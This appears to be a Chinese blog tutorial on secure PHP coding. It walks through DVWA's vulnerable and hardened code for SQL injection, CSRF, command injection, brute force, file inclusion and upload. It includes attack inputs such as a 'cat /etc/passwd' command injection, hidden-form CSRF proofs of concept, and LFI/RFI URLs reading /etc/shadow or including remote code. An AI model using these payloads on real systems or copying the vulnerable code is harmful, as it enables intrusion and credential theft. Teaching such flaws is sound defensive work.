quotemetastripslashesstr_replacestr_replace函数是极其不安全的，因为很多时候可以使用双写绕过替换规则 php内置协议(伪协议)以下伪协议在很多绕过场景下发挥着举足轻重的作用，如后面提到的文件包含file://协议绕过，以及最近才提出的phar协议对象注入，我们可以在不存在可控unserialization（）函数的情况下利用phar反序列化对象，实现对象注入。1234567891011121314file:///var/www/html 访问本地文件系统ftp://&lt;login&gt;:&lt;password&gt;@&lt;ftpserveraddress&gt; 访问FTP(s) URLsdata:// 数据流http:// — 访问 HTTP(s) URLsftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流zlib:// — 压缩流data:// — Data (RFC 2397)glob:// — 查找匹配的文件路径模式phar:// — PHP Archivessh2:// — Secure Shell 2rar:// — RARogg:// — Audio streamsexpect:// — 处理交互式的流 向DVWA学习php安全的代码编写 以下样例来自于DVWA v1.9版本 sql注入 Low level 1234567891011121314151617181920212223242526272829&lt;?php if( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) &#123; // Get values $first = mysql_result( $result, $i, "first_name" ); $last = mysql_result( $result, $i, "last_name" ); // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; // Increase loop count $i++; &#125; mysql_close(); &#125; ?&gt; 在这个例子中，是最low安全等级的php代码编写样例，可以看到，代码中并没有对用户输入的id变量进行检查和过滤，同时使用的是$_REQUEST全局数组的方式，如果不是特别需要，我们编程的时候尽量不要使用$_REQUEST获取用户的参数，因为$_REQUEST的参数比较杂，包括$_GET,$_POST，$_COOKIE等超全局变量，并且二者还存在变量获取顺序的不一致，受配置文件中variables_order的约定，在存在waf的环境下，容易造成绕过，具体可以参看之前写的文章——CTF（第三条tips）。未经处理的用户输入直接与sql语句拼接交互，造成sql注入漏洞，十分危险。 Medium level123456789101112131415161718192021222324252627282930&lt;?php if( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $id = $_POST[ 'id' ]; $id = mysql_real_escape_string( $id ); // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = $id;"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) &#123; // Display values $first = mysql_result( $result, $i, "first_name" ); $last = mysql_result( $result, $i, "last_name" ); // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; // Increase loop count $i++; &#125; //mysql_close(); &#125; ?&gt; 这个版本的代码，与之前的相比只是多了个mysql_real_escape_string函数的过滤，但是要知道这里的$id在sql语句中是数字类型，这样mysql_real_escape_string的转义就会形同虚设，注入仍旧是一马平川。当然不恰当的字符编码，可能会造成宽字节注入，详细可以看之前的文章——sql注入捣鼓 High leval1234567891011121314151617181920212223242526272829&lt;?php if( isset( $_SESSION [ 'id' ] ) ) &#123; // Get input $id = $_SESSION[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"; $result = mysql_query( $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); // Get results $num = mysql_numrows( $result ); $i = 0; while( $i &lt; $num ) &#123; // Get values $first = mysql_result( $result, $i, "first_name" ); $last = mysql_result( $result, $i, "last_name" ); // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; // Increase loop count $i++; &#125; mysql_close(); &#125; ?&gt; 在高级版本中只是把注入点隐匿在了$_SESSION全局变量里面,而session中的id值的注册是通过用户输入$_POST全局变量传入，所以是完全可控的，这样一来，就和之前的注入没有什么不一样。这段代码是要提醒我们对于session，只要注册值是用户可控的，也是可能存在sql注入的风险的。另外需要注意到的是，在这个High级别的注入中，回显和传参页面不是同一个，是一个二阶注入，如果使用工具注入，如sqlmap，别忘了加上自定义回显--second-order参数。 Impossible level123456789101112131415161718192021222324252627282930313233&lt;?php if( isset( $_GET[ 'Submit' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $id = $_GET[ 'id' ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' ); $data-&gt;bindParam( ':id', $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ 'first_name' ]; $last = $row[ 'last_name' ]; // Feedback for end user echo "&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"; &#125; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 根据DVWA的说法，这样写出来的应用，是不存在sql注入的。也即这是个十分安全的php代码编写规范。why?首先，我们可以看到它使用Anti-CSRF token的方法来避免csrf攻击（具体细节会在下文csrf防御谈到），然后在sql语句的编写中，使用的是预处理语句，所谓的预处理就是通过php的pdo预处理机制PDO::prepare，先往数据库送出语句模板，进行解析,编译，然后第二次向数据库传入查询参数，在第二次的查询过程中可以理解为不再进行语义解析，所以即使传入sql语句，也会因为不进行语义解析而失效。所以这是一种比较推荐的数据库交互sql语句编写规范。现在很多主流的数据库已经支持预处理，即使不支持，PHP的PDO也会进行预处理模拟实现，这样对于程序员接口一致，不需了解不同数据库对预处理支持的方式差异。 更多PDO细节可以参考官网：http://php.net/manual/zh/pdo.prepared-statements.php。 参数bind的细节可以查看：http://php.net/manual/zh/pdo.constants.php。 CSRF(完整的攻击过程，可以看这篇前辈的文章：http://www.freebuf.com/articles/web/118352.html) Low level 1234567891011121314151617181920212223242526272829&lt;?php if( isset( $_GET[ 'Change' ] ) ) &#123; // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Feedback for the user echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;"; &#125; else &#123; // Issue with passwords matching echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"; &#125; mysql_close(); &#125; ?&gt; 所谓的CSRF（Cross-site request forgery）直白的翻译就是跨站点请求伪造。说人话就是攻击者通过诱使victim访问其精心构造的url或者访问其精心构造的页面，来使得攻击者可以以victim的身份做诸如发邮件，发消息，改密码等骚操作。在DVWA这个系列里面，模拟的是修改密码的界面。先来看下low等级的代码，可以说是没有进行仍和的再认证，试下为啥是“再认证”？其实我们在访问到这个修改密码界面的时候，已经登陆过一次，服务器会在每次访问时检查session。所以这是第一道认证。但是这种会话级别的认证对csrf是没有抵抗力的。具体的过程可以参看之前提到的链接。我们可以直接构造url1http://localhost/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change# 让victim访问，或者使用更加隐匿的 12345&lt;style&gt; form&#123; display:none; &#125;&lt;/style&gt; 构造无迹表单,结合js发送请求，或者1&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; 来实现欺骗隐匿行踪，达到修改密码的目的。顺便盗用两个别人的poc方便展示： (1) 图片形式诱导12345&lt;img src=&quot;http://192.168.153.130/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt; (2) 隐藏表单的形式 1234567891011121314151617181920 &lt;body onload=&quot;javascript:csrf()&quot;&gt; &lt;script&gt; function csrf()&#123; document.getElementById(&quot;button&quot;).click(); &#125; &lt;/script&gt; &lt;style&gt; form&#123; display:none; &#125; &lt;/style&gt; &lt;form action=&quot;http://www.dvwa.com/vulnerabilities/csrf/?&quot; method=&quot;GET&quot;&gt; New password:&lt;br /&gt; &lt;input type=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot; name=&quot;password_new&quot; value=&quot;test&quot;&gt;&lt;br /&gt; Confirm new password:&lt;br /&gt; &lt;input type=&quot;password&quot; AUTOCOMPLETE=&quot;off&quot; name=&quot;password_conf&quot; value=&quot;test&quot;&gt;&lt;br /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; id=&quot;button&quot; name=&quot;Change&quot; value=&quot;Change&quot; /&gt; &lt;/form&gt;&lt;/body&gt; Medium level123456789101112131415161718192021222324252627282930313233343536&lt;?php if( isset( $_GET[ 'Change' ] ) ) &#123; // Checks to see where the request came from if( eregi( $_SERVER[ 'SERVER_NAME' ], $_SERVER[ 'HTTP_REFERER' ] ) ) &#123; // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Feedback for the user echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;"; &#125; else &#123; // Issue with passwords matching echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"; &#125; &#125; else &#123; // Didn't come from a trusted source echo "&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"; &#125; mysql_close(); &#125; ?&gt; 在这个级别的CSRF漏洞中，服务端多了一句eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ]校验，ereg()函数是模式匹配，通过超全局数组获取了请求头referer值（也就是访问者向host发起请求时所在的页面）和host值，并且检查host的值是否在referer中出现。根据权威(https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name)，这两个值无法以编程的方式修改，抓包除外，因为在csrf中无法通过抓取客户端的包进行修改，所以按理来说是安全的。实则不然，通过公网服务器，诱使victim访问名字包含host的html文件就可以实现绕过。 High level1234567891011121314151617181920212223242526272829303132333435&lt;?php if( isset( $_GET[ 'Change' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update the database $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; $result = mysql_query( $insert ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); // Feedback for the user echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;"; &#125; else &#123; // Issue with passwords matching echo "&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"; &#125; mysql_close(); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 在高级别中的代码，主要是使用了Anti-csrf机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。我们可以按F12来看看这个token: 可以看到不同的用户会返回一个不同的token，这个token在hidden栏里面,这样一来，迫于同源策略，攻击者无法获取victim的token，也就无法实现CSRF攻击。但是真的无法实现吗？配合xss我们还是可以盗取token的，但是这难度无疑增大，我们必须要有服务器的一个xss漏洞来盗取token，然后再使用CSRF。攻击成本也增大。 Impossible level123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php if( isset( $_GET[ 'Change' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $pass_curr = $_GET[ 'password_current' ]; $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Sanitise current password input $pass_curr = stripslashes( $pass_curr ); $pass_curr = mysql_real_escape_string( $pass_curr ); $pass_curr = md5( $pass_curr ); // Check that the current password is correct $data = $db-&gt;prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( ':password', $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; // It does! $pass_new = stripslashes( $pass_new ); $pass_new = mysql_real_escape_string( $pass_new ); $pass_new = md5( $pass_new ); // Update database with new password $data = $db-&gt;prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' ); $data-&gt;bindParam( ':password', $pass_new, PDO::PARAM_STR ); $data-&gt;bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;execute(); // Feedback for the user echo "&lt;pre&gt;Password Changed.&lt;/pre&gt;"; &#125; else &#123; // Issue with passwords matching echo "&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 在high的基础上，直接进行了密码再认证，这样一来，即使盗取了token，没有原始密码，也无法进行修改密码的操作，这样CSRF就可以完全避免了。所以通过这个CSRF系列，我们可以知晓，在csrf防御中，采用关键操作的原子性认证，是避免这一漏洞攻击的不二办法。其实我们只关注了CSRF部分，在之前的level中，也还存在了sql注入，在这个impossible版本里，还使用了之前提到的预操纵来进行数据库交互，降低了sql注入的风险。 Command Injection Low level12345678910111213141516171819202122&lt;?php if( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"; &#125; ?&gt; 过分相信用户的输入，直接拼接到ping 命令中，会造成命令注入。注意到常用的bash命令拼接的方式有||.&amp;&amp;,|,&amp;,;这五个，所以由于没有过滤完全，我们直接进行命令拼接，然后执行任意命令，如127.0.0.1;cat /etc/passwd。 Medium level123456789101112131415161718192021222324252627282930&lt;?php if( isset( $_POST[ 'Submit' ] ) ) &#123; // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '&amp;&amp;' =&gt; '', ';' =&gt; '', ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"; &#125; ?&gt; 这里采用黑名单过滤的方式，注意到黑名单的办法存在的通病就是过滤不完全。可以看到这里也一样，没有把之前提到的东西给过滤完全。其实highlevel也是一样的，过滤语句写得不严谨，多加了空格，造成绕过，这里就不再展开叙述了。同过这个例子可以直观的看到黑名单式过滤方式是不安全的，容易出岔子。接着我们将看到Impossible等级下的白名单试想方式。直接指定只接受num.num.num.num型的输入，也就是我们期望的输入，从而避免了命令执行。 Impossible level123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php if( isset( $_POST[ 'Submit' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST[ 'ip' ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( ".", $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int's put the IP back together. $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125; else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125; // Feedback for the end user echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"; &#125; else &#123; // Ops. Let the user name theres a mistake echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'; &#125; &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; Brute Force暴力枚举攻击，服务端没有在后台设置错误次数上限和相关校验，就会给攻击者暴力枚举用户或者基于字典的密码暴力破解。所以正确的代码编写规范需要规定容许的错误尝试次数，超过这个值就会锁定账户一个定义长的时间。这里需要明确，光加入一个随机的token就想避免Brute Force是相当幼稚的，攻击者通过python脚本来抓取页面的token，就可以完全绕过，这也是high等级所犯的错。这里就不展示，只列出impossible等级和low 等级的代码，供日后查阅： low level 1234567891011121314151617181920212223242526272829303132&lt;?php if( isset( $_GET[ 'Login' ] ) ) &#123; // Get username $user = $_GET[ 'username' ]; // Get password $pass = $_GET[ 'password' ]; $pass = md5( $pass ); // Check the database $query = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) &#123; // Get users details $avatar = mysql_result( $result, 0, "avatar" ); // Login successful echo "&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; &#125; else &#123; // Login failed echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"; &#125; mysql_close(); &#125; ?&gt; Impossible level 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;?php if( isset( $_POST[ 'Login' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_POST[ 'username' ]; $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_POST[ 'password' ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ 'failed_login' ] &gt;= $total_failed_login ) ) &#123; // User locked out. Note, using this method would allow for user enumeration! //echo "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;"; // Calculate when the user would be allowed to login again $last_login = $row[ 'last_login' ]; $last_login = strtotime( $last_login ); $timeout = strtotime( "&#123;$last_login&#125; +&#123;$lockout_time&#125; minutes" ); $timenow = strtotime( "now" ); // Check to see if enough time has passed, if it hasn't locked the account if( $timenow &gt; $timeout ) $account_locked = true; &#125; // Check the database (if username matches the password) $data = $db-&gt;prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR); $data-&gt;bindParam( ':password', $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123; // Get users details $avatar = $row[ 'avatar' ]; $failed_login = $row[ 'failed_login' ]; $last_login = $row[ 'last_login' ]; // Login successful echo "&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;"; echo "&lt;img src=\"&#123;$avatar&#125;\" /&gt;"; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) &#123; echo "&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;"; echo "&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;"; &#125; // Reset bad login count $data = $db-&gt;prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-&gt;execute(); &#125; else &#123; // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo "&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;"; // Update bad login count $data = $db-&gt;prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-&gt;execute(); &#125; // Set the last login time $data = $db-&gt;prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' ); $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-&gt;execute(); &#125; // Generate Anti-CSRF token generateSessionToken(); ?&gt; 我们可以看到，在impossible代码中，不但设置了错误次数锁，Anti-CSRF token,而且还提供了暴力尝试信息反馈，当用户登陆成功后会将被暴力登陆的次数给反馈给正确登陆的用户。这个实现得益于，每次错误尝试都会更新last_login的时间和failed_login+1操作，然后将之入库。 Local File Inclusion) 漏洞根据利用方式可以分为：本地文件包含(Local File Inclusion),简称LFI。远程文件包含(Remote File Inclusion),简称RFI。 涉及到的函数如下：1234567include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。 include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。 require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 文件包含光从字面意思来看是可以通过漏洞利用泄露一些本地敏感文件，但是益于以上几个函数在包含文件的时候是默认把文件当成代码来对待，如果出现可执行的php片段就会执行这一性质，文件包含漏洞一般是可以进行任意代码执行的，只要我们能够让服务器包含我们可控的代码段。 Low level123456&lt;?php // The page we wish to display $file = $_GET[ 'page' ]; ?&gt; 没有对我们的输入做任何过滤，可以说是一点安全意识都没有。随便利用。举个栗子：http://localhost/dvwa/vulnerabilities/fi/page=/etc/shadow当然也可以在服务端写下poc.php,利用http协议实现代码执行http://localhost/dvwa/vulnerabilities/fi/page=http://[ip]/poc.php。前提条件是allow_url_fopen和allow_url_include处于打开状态。 Medium level123456789&lt;?php // The page we wish to display $file = $_GET[ 'page' ]; // Input validation $file = str_replace( array( "http://", "https://" ), "", $file ); $file = str_replace( array( "../", "..\"" ), "", $file ); ?&gt; 首先这个基于黑名单的过滤，压根就没有把本地绝对路径考虑到，其次可以使用..././,htthttpp进行绕过。 High level12345678910111213&lt;?php // The page we wish to display $file = $_GET[ 'page' ]; // Input validation if( !fnmatch( "file*", $file ) &amp;&amp; $file != "include.php" ) &#123; // This isn't the page we want! echo "ERROR: File not found!"; exit; &#125; ?&gt; 这是一种基于白名单的过滤，只接受前缀为“file”的文件，咋一看很ok，然而却疏忽了file协议。http://localhost/vulnerabilities/fi/?page=file:///etc/passwd Impossible level1234567891011121314&lt;?php // The page we wish to display $file = $_GET[ &apos;page&apos; ]; // Only allow include.php or file&#123;1..3&#125;.php if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; // This isn&apos;t the page we want! echo &quot;ERROR: File not found!&quot;; exit; &#125; ?&gt; 这是相当的白名单，你赢了。但是想要文件量巨大的场景中维护这么一张白名单有点不太理智，所以笔者这种硬编码的方式不太常用。 upload file上传漏洞经常可以用来上传任意代码泄露系统信息，如&lt;?php phpinfo();?&gt;，甚至可以直接上传webshell，拿下服务器权限，所以这个漏洞是十分严重的。 Low level12345678910111213141516171819&lt;?php if( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; ?&gt; 可以看到上面的代码对用户上传的文件（$_FILE全局数组的形式）没有进行任何的验证操作，就直接将其move到了upload目录，这是相当危险的操作，攻击者可以毫无忌惮的随意日。 Medium level12345678910111213141516171819202122232425262728293031323334&lt;?php if( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; #只判断了MIME // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125; &#125; ?&gt; 上面的代码加入了MIME判断，所谓的MIME判断是在请求头中的一个字段，用来指示文件类型，方便服务器进行对应的处理，只要抓包就可以随意修改，达到欺骗服务器的目的。（更多的解释可以查看：https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types） High level1234567891011121314151617181920212223242526272829303132333435&lt;?php if( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! echo "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; else &#123; // Invalid file echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125; &#125; ?&gt; 我们首先看到这个代码中使用的验证手段( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ), 首先判断文件名结尾是不是’jpg’,’jepg’,’png’类型，然后调用getimagesize()函数获取图像大小，其实就是判断图像格式是否规范。函数细节可以参看官网表述:（http://php.net/manual/zh/function.getimagesize.php） 